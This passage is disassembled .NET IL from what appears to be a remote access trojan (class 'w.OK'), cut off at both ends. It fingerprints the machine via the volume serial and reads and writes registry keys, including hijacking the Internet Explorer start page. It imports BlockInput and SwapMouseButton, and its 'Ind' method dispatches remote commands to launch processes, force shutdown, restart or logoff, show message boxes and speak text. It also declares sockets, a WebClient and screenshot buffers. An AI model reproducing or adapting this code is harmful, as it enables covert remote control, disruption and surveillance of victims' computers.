                                    object 'ret') cil managed
  {
    // Code size       95 (0x5f)
    .maxstack  3
    .locals init ([0] object GTV,
             [1] class [mscorlib]System.Exception exception1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string w.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_003b:  stloc.0
      IL_003c:  leave.s    IL_005d

      IL_003e:  leave.s    IL_0058

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0040:  dup
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  stloc.1
      IL_0047:  nop
      IL_0048:  ldarg.1
      IL_0049:  stloc.0
      IL_004a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004f:  leave.s    IL_005d

      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  leave.s    IL_0058

    }  // end handler
    IL_0058:  nop
    IL_0059:  ldnull
    IL_005a:  stloc.0
    IL_005b:  br.s       IL_005d

    IL_005d:  ldloc.0
    IL_005e:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       110 (0x6e)
    .maxstack  8
    .locals init ([0] string HWD,
             [1] string result,
             [2] int32 arg_2F_2,
             [3] int32 num,
             [4] int32 num2,
             [5] int32 number,
             [6] string text,
             [7] string text2,
             [8] string text3,
             [9] class [mscorlib]System.Exception expr_3E)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldstr      "SystemDrive"
      IL_0007:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000c:  ldstr      "\\"
      IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0016:  stloc.s    text
      IL_0018:  ldnull
      IL_0019:  stloc.s    text2
      IL_001b:  ldc.i4.0
      IL_001c:  stloc.2
      IL_001d:  ldc.i4.0
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.0
      IL_0020:  stloc.s    num2
      IL_0022:  ldnull
      IL_0023:  stloc.s    text3
      IL_0025:  ldloca.s   text
      IL_0027:  ldloca.s   text2
      IL_0029:  ldloc.2
      IL_002a:  ldloca.s   number
      IL_002c:  ldloca.s   num
      IL_002e:  ldloca.s   num2
      IL_0030:  ldloca.s   text3
      IL_0032:  ldc.i4.0
      IL_0033:  call       int32 w.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0038:  pop
      IL_0039:  ldloc.s    number
      IL_003b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_0040:  stloc.1
      IL_0041:  leave.s    IL_0067

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0043:  dup
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  stloc.s    expr_3E
      IL_004b:  nop
      IL_004c:  ldloc.s    expr_3E
      IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0053:  nop
      IL_0054:  ldstr      "ERR"
      IL_0059:  stloc.1
      IL_005a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005f:  nop
      IL_0060:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0065:  leave.s    IL_0067

    }  // end handler
    IL_0067:  nop
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  br.s       IL_006c

    IL_006c:  ldloc.0
    IL_006d:  ret
  } // end of method OK::HWD

  .method public static object  MH(string H) cil managed
  {
    // Code size       51 (0x33)
    .maxstack  4
    .locals init ([0] object MH,
             [1] string[] strArray,
             [2] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldstr      ","
    IL_0007:  ldc.i4.m1
    IL_0008:  ldc.i4.0
    IL_0009:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_000e:  stloc.1
    IL_000f:  ldsfld     int32 w.OK::NH
    IL_0014:  ldloc.1
    IL_0015:  ldlen
    IL_0016:  conv.ovf.i4
    IL_0017:  clt
    IL_0019:  ldc.i4.0
    IL_001a:  ceq
    IL_001c:  stloc.2
    IL_001d:  ldloc.2
    IL_001e:  brfalse.s  IL_0026

    IL_0020:  ldc.i4.0
    IL_0021:  stsfld     int32 w.OK::NH
    IL_0026:  nop
    IL_0027:  ldloc.1
    IL_0028:  ldsfld     int32 w.OK::NH
    IL_002d:  ldelem.ref
    IL_002e:  stloc.0
    IL_002f:  br.s       IL_0031

    IL_0031:  ldloc.0
    IL_0032:  ret
  } // end of method OK::MH

  .method public static pinvokeimpl("user32" as "BlockInput" nomangle ansi lasterr winapi) 
          int32  apiBlockInput(int32 fBlock) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int64  SwapMouseButton(int64 bSwap) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage(int32 hWnd,
                            uint32 msg,
                            uint32 wParam,
                            int32 lparam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  SetWindowPos(int32 hwnd,
                              int32 hWndInsertAfter,
                              int32 x,
                              int32 y,
                              int32 cx,
                              int32 cy,
                              int32 wFlags) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("winmm.dll" as "mciSendStringA" nomangle ansi lasterr winapi) 
          int64  mciSendString(string&  marshal( byvalstr) lpCommandString,
                               string&  marshal( byvalstr) lpReturnString,
                               int64 uReturnLength,
                               int64 hwndCallback) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method public static void  AddHome(string text) cil managed
  {
    // Code size       33 (0x21)
    .maxstack  3
    .locals init ([0] class [mscorlib]Microsoft.Win32.RegistryKey key)
    IL_0000:  nop
    IL_0001:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
    IL_0006:  ldstr      "Software\\Microsoft\\Internet Explorer\\Main"
    IL_000b:  ldc.i4.1
    IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_0011:  stloc.0
    IL_0012:  ldloc.0
    IL_0013:  ldstr      "Start Page"
    IL_0018:  ldarg.0
    IL_0019:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                       object)
    IL_001e:  nop
    IL_001f:  nop
    IL_0020:  ret
  } // end of method OK::AddHome

  .method public static void  Ind(uint8[] b) cil managed noinlining
  {
    // Code size       6448 (0x1930)
    .maxstack  9
    .locals init ([0] string[] strArray,
             [1] uint8[] buffer,
             [2] uint8[] bytes,
             [3] class [System]System.Net.WebClient client,
             [4] class [System]System.Net.WebClient client2,
             [5] string fileName,
             [6] string path,
             [7] string str4,
             [8] valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons messagebutton,
             [9] valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon messageicon,
             [10] object SAPI,
             [11] uint8[] array1,
             [12] class [System]System.Net.IPEndPoint ipendpoint1,
             [13] class [System]System.Net.Sockets.Socket socket1,
             [14] class [mscorlib]System.Exception V_14,
             [15] class [mscorlib]System.Exception ex,
             [16] string patfh,
             [17] class [System]System.Net.WebClient aaaa,
             [18] class [mscorlib]System.Exception V_18,
             [19] class [mscorlib]System.Exception V_19,
             [20] string aa,
             [21] string patfh2,
             [22] class [mscorlib]System.Exception V_22,
             [23] int32 length,
             [24] class [mscorlib]System.IO.MemoryStream 'stream',
             [25] class [mscorlib]System.Exception exception,
             [26] class [mscorlib]System.Exception exception1,
             [27] class [mscorlib]System.Exception exception10,
             [28] class [mscorlib]System.Exception exception2,
             [29] class [mscorlib]System.Exception exception11,
             [30] class [mscorlib]System.Exception exception3,
             [31] uint8[] t,
             [32] object objectValue,
             [33] int32 offset,
             [34] class [mscorlib]System.IO.MemoryStream stream2,
             [35] uint8[] buffer3,
             [36] object 'instance',
             [37] int32 num3,
             [38] class [mscorlib]System.IO.MemoryStream stream3,
             [39] class [System.Drawing]System.Drawing.Bitmap bitmap2,
             [40] valuetype [System.Drawing]System.Drawing.Size blockRegionSize,
             [41] valuetype [System.Drawing]System.Drawing.Rectangle bounds,
             [42] class [System.Drawing]System.Drawing.Graphics g,
             [43] class [System.Drawing]System.Drawing.Bitmap image,
             [44] string str2,
             [45] class [mscorlib]System.IO.MemoryStream stream4,
             [46] class [mscorlib]System.IO.MemoryStream stream5,
             [47] class [mscorlib]System.Exception exception12,
             [48] int32 num4,
             [49] class [mscorlib]System.IO.MemoryStream stream6,
             [50] class [mscorlib]System.Exception exception13,
             [51] class [mscorlib]System.Exception exception14,
             [52] class [mscorlib]System.Exception exception15,
             [53] class [mscorlib]System.Exception exception7,
             [54] object[] arguments,
             [55] bool[] copyBack,
             [56] int32 num5,
             [57] int32 num6,
             [58] class [mscorlib]System.IO.MemoryStream stream7,
             [59] class [mscorlib]System.Exception exception16,
             [60] class [mscorlib]System.Exception exception8,
             [61] class [mscorlib]System.Exception exception17,
             [62] string VB$t_string$L0,
             [63] string VB$t_string$L1,
             [64] string VB$t_string$L2,
             [65] string[] VB$t_array$S0,
             [66] int32 VB$t_i4$S0,
             [67] object[] VB$t_array$S1,
             [68] object[] VB$t_array$S2,
             [69] bool[] VB$t_array$S3,
             [70] string VB$t_string$S3,
             [71] string VB$t_string$S4,
             [72] string VB$t_string$L5,
             [73] string VB$t_string$L6,
             [74] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S0,
             [75] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S1,
             [76] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S2,
             [77] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S3,
             [78] string VB$t_string$L7,
             [79] bool VB$CG$t_bool$S0,
             [80] bool VB$CG$t_bool$S1)
    IL_0000:  nop
    IL_0001:  ldarga.s   b
    IL_0003:  call       string w.OK::BS(uint8[]&)
    IL_0008:  ldsfld     string w.OK::Y
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    IL_0015:  nop
    .try
    {
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.s    str4
      IL_001b:  nop
      IL_001c:  ldloc.s    str4
      IL_001e:  stloc.s    VB$t_string$L0
      IL_0020:  nop
      IL_0021:  ldloc.s    VB$t_string$L0
      IL_0023:  ldstr      "nwpr"
      IL_0028:  ldc.i4.0
      IL_0029:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_002e:  ldc.i4.0
      IL_002f:  ceq
      IL_0031:  stloc.s    VB$CG$t_bool$S0
      IL_0033:  ldloc.s    VB$CG$t_bool$S0
      IL_0035:  brfalse.s  IL_0046

      IL_0037:  nop
      IL_0038:  ldloc.0
      IL_0039:  ldc.i4.1
      IL_003a:  ldelem.ref
      IL_003b:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0040:  pop
      IL_0041:  br         IL_0bd7

      IL_0046:  nop
      IL_0047:  ldloc.s    VB$t_string$L0
      IL_0049:  ldstr      "site"
      IL_004e:  ldc.i4.0
      IL_004f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0054:  ldc.i4.0
      IL_0055:  ceq
      IL_0057:  stloc.s    VB$CG$t_bool$S0
      IL_0059:  ldloc.s    VB$CG$t_bool$S0
      IL_005b:  brfalse.s  IL_006e

      IL_005d:  nop
      IL_005e:  ldstr      "site"
      IL_0063:  call       bool w.OK::Send(string)
      IL_0068:  pop
      IL_0069:  br         IL_0bd7

      IL_006e:  nop
      IL_006f:  ldloc.s    VB$t_string$L0
      IL_0071:  ldstr      "fun"
      IL_0076:  ldc.i4.0
      IL_0077:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_007c:  ldc.i4.0
      IL_007d:  ceq
      IL_007f:  stloc.s    VB$CG$t_bool$S0
      IL_0081:  ldloc.s    VB$CG$t_bool$S0
      IL_0083:  brfalse.s  IL_0096

      IL_0085:  nop
      IL_0086:  ldstr      "fun"
      IL_008b:  call       bool w.OK::Send(string)
      IL_0090:  pop
      IL_0091:  br         IL_0bd7

      IL_0096:  nop
      IL_0097:  ldloc.s    VB$t_string$L0
      IL_0099:  ldstr      "IEhome"
      IL_009e:  ldc.i4.0
      IL_009f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00a4:  ldc.i4.0
      IL_00a5:  ceq
      IL_00a7:  stloc.s    VB$CG$t_bool$S0
      IL_00a9:  ldloc.s    VB$CG$t_bool$S0
      IL_00ab:  brfalse.s  IL_00bc

      IL_00ad:  nop
      IL_00ae:  ldloc.0
      IL_00af:  ldc.i4.1
      IL_00b0:  ldelem.ref
      IL_00b1:  call       void w.OK::AddHome(string)
      IL_00b6:  nop
      IL_00b7:  br         IL_0bd7

      IL_00bc:  nop
      IL_00bd:  ldloc.s    VB$t_string$L0
      IL_00bf:  ldstr      "shutdowncomputer"
      IL_00c4:  ldc.i4.0
      IL_00c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00ca:  ldc.i4.0
      IL_00cb:  ceq
      IL_00cd:  stloc.s    VB$CG$t_bool$S0
      IL_00cf:  ldloc.s    VB$CG$t_bool$S0
      IL_00d1:  brfalse.s  IL_00e7

      IL_00d3:  nop
      IL_00d4:  ldstr      "shutdown -s -t 00"
      IL_00d9:  ldc.i4.0
      IL_00da:  ldc.i4.0
      IL_00db:  ldc.i4.m1
      IL_00dc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00e1:  pop
      IL_00e2:  br         IL_0bd7

      IL_00e7:  nop
      IL_00e8:  ldloc.s    VB$t_string$L0
      IL_00ea:  ldstr      "restartcomputer"
      IL_00ef:  ldc.i4.0
      IL_00f0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00f5:  ldc.i4.0
      IL_00f6:  ceq
      IL_00f8:  stloc.s    VB$CG$t_bool$S0
      IL_00fa:  ldloc.s    VB$CG$t_bool$S0
      IL_00fc:  brfalse.s  IL_0112

      IL_00fe:  nop
      IL_00ff:  ldstr      "shutdown -r -t 00"
      IL_0104:  ldc.i4.0
      IL_0105:  ldc.i4.0
      IL_0106:  ldc.i4.m1
      IL_0107:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_010c:  pop
      IL_010d:  br         IL_0bd7

      IL_0112:  nop
      IL_0113:  ldloc.s    VB$t_string$L0
      IL_0115:  ldstr      "logoff"
      IL_011a:  ldc.i4.0
      IL_011b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0120:  ldc.i4.0
      IL_0121:  ceq
      IL_0123:  stloc.s    VB$CG$t_bool$S0
      IL_0125:  ldloc.s    VB$CG$t_bool$S0
      IL_0127:  brfalse.s  IL_013d

      IL_0129:  nop
      IL_012a:  ldstr      "shutdown -l -t 00"
      IL_012f:  ldc.i4.0
      IL_0130:  ldc.i4.0
      IL_0131:  ldc.i4.m1
      IL_0132:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0137:  pop
      IL_0138:  br         IL_0bd7

      IL_013d:  nop
      IL_013e:  ldloc.s    VB$t_string$L0
      IL_0140:  ldstr      "ErorrMsg"
      IL_0145:  ldc.i4.0
      IL_0146:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_014b:  ldc.i4.0
      IL_014c:  ceq
      IL_014e:  stloc.s    VB$CG$t_bool$S0
      IL_0150:  ldloc.s    VB$CG$t_bool$S0
      IL_0152:  brfalse    IL_02a0

      IL_0157:  nop
      IL_0158:  nop
      IL_0159:  ldloc.0
      IL_015a:  ldc.i4.1
      IL_015b:  ldelem.ref
      IL_015c:  stloc.s    VB$t_string$L1
      IL_015e:  nop
      IL_015f:  ldloc.s    VB$t_string$L1
      IL_0161:  ldstr      "1"
      IL_0166:  ldc.i4.0
      IL_0167:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_016c:  ldc.i4.0
      IL_016d:  ceq
      IL_016f:  stloc.s    VB$CG$t_bool$S1
      IL_0171:  ldloc.s    VB$CG$t_bool$S1
      IL_0173:  brfalse.s  IL_017c

      IL_0175:  nop
      IL_0176:  ldc.i4.s   64
      IL_0178:  stloc.s    messageicon
      IL_017a:  br.s       IL_01d4

      IL_017c:  nop
      IL_017d:  ldloc.s    VB$t_string$L1
      IL_017f:  ldstr      "2"
      IL_0184:  ldc.i4.0
      IL_0185:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_018a:  ldc.i4.0
      IL_018b:  ceq
      IL_018d:  stloc.s    VB$CG$t_bool$S1
      IL_018f:  ldloc.s    VB$CG$t_bool$S1
      IL_0191:  brfalse.s  IL_019a

      IL_0193:  nop
      IL_0194:  ldc.i4.s   32
      IL_0196:  stloc.s    messageicon
      IL_0198:  br.s       IL_01d4

      IL_019a:  nop
      IL_019b:  ldloc.s    VB$t_string$L1
      IL_019d:  ldstr      "3"
      IL_01a2:  ldc.i4.0
      IL_01a3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01a8:  ldc.i4.0
      IL_01a9:  ceq
      IL_01ab:  stloc.s    VB$CG$t_bool$S1
      IL_01ad:  ldloc.s    VB$CG$t_bool$S1
      IL_01af:  brfalse.s  IL_01b8

      IL_01b1:  nop
      IL_01b2:  ldc.i4.s   48
      IL_01b4:  stloc.s    messageicon
      IL_01b6:  br.s       IL_01d4

      IL_01b8:  nop
      IL_01b9:  ldloc.s    VB$t_string$L1
      IL_01bb:  ldstr      "4"
      IL_01c0:  ldc.i4.0
      IL_01c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01c6:  ldc.i4.0
      IL_01c7:  ceq
      IL_01c9:  stloc.s    VB$CG$t_bool$S1
      IL_01cb:  ldloc.s    VB$CG$t_bool$S1
      IL_01cd:  brfalse.s  IL_01d4

      IL_01cf:  nop
      IL_01d0:  ldc.i4.s   16
      IL_01d2:  stloc.s    messageicon
      IL_01d4:  nop
      IL_01d5:  nop
      IL_01d6:  ldloc.0
      IL_01d7:  ldc.i4.2
      IL_01d8:  ldelem.ref
      IL_01d9:  stloc.s    VB$t_string$L2
      IL_01db:  nop
      IL_01dc:  ldloc.s    VB$t_string$L2
      IL_01de:  ldstr      "1"
      IL_01e3:  ldc.i4.0
      IL_01e4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01e9:  ldc.i4.0
      IL_01ea:  ceq
      IL_01ec:  stloc.s    VB$CG$t_bool$S1
      IL_01ee:  ldloc.s    VB$CG$t_bool$S1
      IL_01f0:  brfalse.s  IL_01fb

      IL_01f2:  nop
      IL_01f3:  ldc.i4.4
      IL_01f4:  stloc.s    messagebutton
      IL_01f6:  br         IL_028a

      IL_01fb:  nop
      IL_01fc:  ldloc.s    VB$t_string$L2
      IL_01fe:  ldstr      "2"
      IL_0203:  ldc.i4.0
      IL_0204:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0209:  ldc.i4.0
      IL_020a:  ceq
      IL_020c:  stloc.s    VB$CG$t_bool$S1
      IL_020e:  ldloc.s    VB$CG$t_bool$S1
      IL_0210:  brfalse.s  IL_0218

      IL_0212:  nop
      IL_0213:  ldc.i4.3
      IL_0214:  stloc.s    messagebutton
      IL_0216:  br.s       IL_028a

      IL_0218:  nop
      IL_0219:  ldloc.s    VB$t_string$L2
      IL_021b:  ldstr      "3"
      IL_0220:  ldc.i4.0
      IL_0221:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0226:  ldc.i4.0
      IL_0227:  ceq
      IL_0229:  stloc.s    VB$CG$t_bool$S1
      IL_022b:  ldloc.s    VB$CG$t_bool$S1
      IL_022d:  brfalse.s  IL_0235

      IL_022f:  nop
      IL_0230:  ldc.i4.0
      IL_0231:  stloc.s    messagebutton
      IL_0233:  br.s       IL_028a

      IL_0235:  nop
      IL_0236:  ldloc.s    VB$t_string$L2
      IL_0238:  ldstr      "4"
      IL_023d:  ldc.i4.0
      IL_023e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0243:  ldc.i4.0
      IL_0244:  ceq
      IL_0246:  stloc.s    VB$CG$t_bool$S1
      IL_0248:  ldloc.s    VB$CG$t_bool$S1
      IL_024a:  brfalse.s  IL_0252

      IL_024c:  nop
      IL_024d:  ldc.i4.1
      IL_024e:  stloc.s    messagebutton
      IL_0250:  br.s       IL_028a

      IL_0252:  nop
      IL_0253:  ldloc.s    VB$t_string$L2
      IL_0255:  ldstr      "5"
      IL_025a:  ldc.i4.0
      IL_025b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0260:  ldc.i4.0
      IL_0261:  ceq
      IL_0263:  stloc.s    VB$CG$t_bool$S1
      IL_0265:  ldloc.s    VB$CG$t_bool$S1
      IL_0267:  brfalse.s  IL_026f

      IL_0269:  nop
      IL_026a:  ldc.i4.5
      IL_026b:  stloc.s    messagebutton
      IL_026d:  br.s       IL_028a

      IL_026f:  nop
      IL_0270:  ldloc.s    VB$t_string$L2
      IL_0272:  ldstr      "6"
      IL_0277:  ldc.i4.0
      IL_0278:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_027d:  ldc.i4.0
      IL_027e:  ceq
      IL_0280:  stloc.s    VB$CG$t_bool$S1
      IL_0282:  ldloc.s    VB$CG$t_bool$S1
      IL_0284:  brfalse.s  IL_028a

      IL_0286:  nop
      IL_0287:  ldc.i4.2
      IL_0288:  stloc.s    messagebutton
      IL_028a:  nop
      IL_028b:  ldloc.0
      IL_028c:  ldc.i4.4
      IL_028d:  ldelem.ref
      IL_028e:  ldloc.0
      IL_028f:  ldc.i4.3
      IL_0290:  ldelem.ref
      IL_0291:  ldloc.s    messagebutton
      IL_0293:  ldloc.s    messageicon
      IL_0295:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_029a:  pop
      IL_029b:  br         IL_0bd7

      IL_02a0:  nop
      IL_02a1:  ldloc.s    VB$t_string$L0
      IL_02a3:  ldstr      "peech"
      IL_02a8:  ldc.i4.0
      IL_02a9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02ae:  ldc.i4.0
      IL_02af:  ceq
      IL_02b1:  stloc.s    VB$CG$t_bool$S1
      IL_02b3:  ldloc.s    VB$CG$t_bool$S1
      IL_02b5:  brfalse    IL_033d

      IL_02ba:  nop
      IL_02bb:  ldstr      "SAPI.Spvoice"
      IL_02c0:  ldstr      ""
      IL_02c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_02ca:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_02cf:  stloc.s    SAPI
      IL_02d1:  ldloc.s    SAPI
      IL_02d3:  ldnull
      IL_02d4:  ldstr      "speak"
      IL_02d9:  ldc.i4.1
      IL_02da:  newarr     [mscorlib]System.Object
      IL_02df:  stloc.s    VB$t_array$S1
      IL_02e1:  ldloc.s    VB$t_array$S1
      IL_02e3:  ldc.i4.0
      IL_02e4:  ldloc.0
      IL_02e5:  stloc.s    VB$t_array$S0
      IL_02e7:  ldloc.s    VB$t_array$S0
      IL_02e9:  ldc.i4.1
      IL_02ea:  stloc.s    VB$t_i4$S0
      IL_02ec:  ldloc.s    VB$t_i4$S0
      IL_02ee:  ldelem.ref
      IL_02ef:  stelem.ref
      IL_02f0:  nop
      IL_02f1:  ldloc.s    VB$t_array$S1
      IL_02f3:  stloc.s    VB$t_array$S2
      IL_02f5:  ldloc.s    VB$t_array$S2
      IL_02f7:  ldnull
      IL_02f8:  ldnull
      IL_02f9:  ldc.i4.1
      IL_02fa:  newarr     [mscorlib]System.Boolean
      IL_02ff:  stloc.s    VB$t_array$S3
      IL_0301:  ldloc.s    VB$t_array$S3
      IL_0303:  ldc.i4.0
      IL_0304:  ldc.i4.1
      IL_0305:  stelem.i1
      IL_0306:  ldloc.s    VB$t_array$S3
      IL_0308:  ldc.i4.1
      IL_0309:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_030e:  pop
      IL_030f:  ldloc.s    VB$t_array$S3
      IL_0311:  ldc.i4.0
      IL_0312:  ldelem.i1
      IL_0313:  brfalse.s  IL_0338

      IL_0315:  ldloc.s    VB$t_array$S0
      IL_0317:  ldloc.s    VB$t_i4$S0
      IL_0319:  ldloc.s    VB$t_array$S2
      IL_031b:  ldc.i4.0
      IL_031c:  ldelem.ref
      IL_031d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
